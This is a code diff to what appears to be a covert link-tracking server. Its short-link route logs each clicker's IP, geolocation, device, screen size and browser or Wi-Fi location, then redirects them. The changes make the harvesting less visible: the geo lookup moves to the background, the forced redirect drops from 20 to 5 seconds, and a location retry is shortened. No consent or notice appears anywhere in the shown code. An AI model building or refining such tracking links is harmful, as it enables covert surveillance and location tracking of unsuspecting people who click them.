@@ -12,7 +12,7 @@ dotenv.config();
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-const PORT = process.env.PORT || 3000;
+const PORT = 3000;
 
 // Memory Data storage
 interface ClickData {
@@ -875,24 +875,21 @@ app.get("/t/:shortCode", async (req, res) => {
   const userAgent = req.headers["user-agent"] || "Mozilla/5.0 Unknown";
   const referer = req.headers["referer"] || "Direct";
 
-  // Geo info lookup
-  const geo = await getGeoLocation(rawIp);
-  await alignGeoLabelsWithCoordinates(geo);
-
-  // User Agent details
+  // User Agent details (sync, no delay)
   const uaDetails = parseUserAgent(userAgent);
 
+  // Create click record immediately with placeholder geo
   const newClick: ClickData = {
     id: clicks.length + 1,
     timestamp: new Date().toISOString(),
-    ip: geo.ip,
-    city: geo.city,
-    region: geo.region,
-    country: geo.country,
-    latitude: geo.latitude,
-    longitude: geo.longitude,
-    org: geo.org,
-    timezone: geo.timezone,
+    ip: rawIp,
+    city: "Resolving...",
+    region: "Resolving...",
+    country: "—",
+    latitude: "",
+    longitude: "",
+    org: "Resolving...",
+    timezone: "Unknown",
     device_type: uaDetails.device_type,
     os: uaDetails.os,
     browser: uaDetails.browser,
@@ -901,7 +898,7 @@ app.get("/t/:shortCode", async (req, res) => {
     target_url: linkMapping.target_url,
     short_code: shortCode,
     location_source: "ip_geo",
-    accuracy_meters: geo.latitude ? 5000 : 0, // Default IP geo accuracy ~5km
+    accuracy_meters: 0,
   };
 
   clicks.push(newClick);
@@ -911,8 +908,32 @@ app.get("/t/:shortCode", async (req, res) => {
   linkMapping.clicksCount += 1;
   updateLinksFile();
 
-  // Send real-time WebSockets event
+  // Send real-time WebSockets event immediately (with placeholder geo)
   io.emit("new_click", newClick);
+
+  // Geo lookup happens in background — does NOT block the redirect
+  (async () => {
+    try {
+      const geo = await getGeoLocation(rawIp);
+      await alignGeoLabelsWithCoordinates(geo);
+
+      newClick.ip = geo.ip;
+      newClick.city = geo.city;
+      newClick.region = geo.region;
+      newClick.country = geo.country;
+      newClick.latitude = geo.latitude;
+      newClick.longitude = geo.longitude;
+      newClick.org = geo.org;
+      newClick.timezone = geo.timezone;
+      newClick.accuracy_meters = geo.latitude ? 5000 : 0;
+
+      updateClicksFile();
+      // Push updated click to dashboard once geo resolves
+      io.emit("click_updated", newClick);
+    } catch (err) {
+      console.warn("[background geo] Failed for click", newClick.id, err);
+    }
+  })();
 
   const targetUrlJson = JSON.stringify(linkMapping.target_url);
   const clickIdJson = JSON.stringify(newClick.id);
@@ -1073,8 +1094,8 @@ app.get("/t/:shortCode", async (req, res) => {
             window.onerror = function() { try { redirect(); } catch (err) {} return true; };
             window.onunhandledrejection = function() { try { redirect(); } catch (err) {} };
 
-            // Safety timeout — increased from 15000ms to 20000ms
-            const enforceRedirectTimeout = setTimeout(redirect, 20000);
+            // Safety timeout — redirect after 5s no matter what
+            const enforceRedirectTimeout = setTimeout(redirect, 5000);
 
             let screenWidth = 0, screenHeight = 0;
             try { if (window.screen) { screenWidth = window.screen.width || 0; screenHeight = window.screen.height || 0; } } catch (e) {}
@@ -1239,7 +1260,7 @@ app.get("/t/:shortCode", async (req, res) => {
                       } else {
                         sendWifiLocationTrace();
                       }
-                    }, 3000);
+                    }, 1500);
                   },
                   {
                     enableHighAccuracy: false,  // Fast, non-GPS fix first
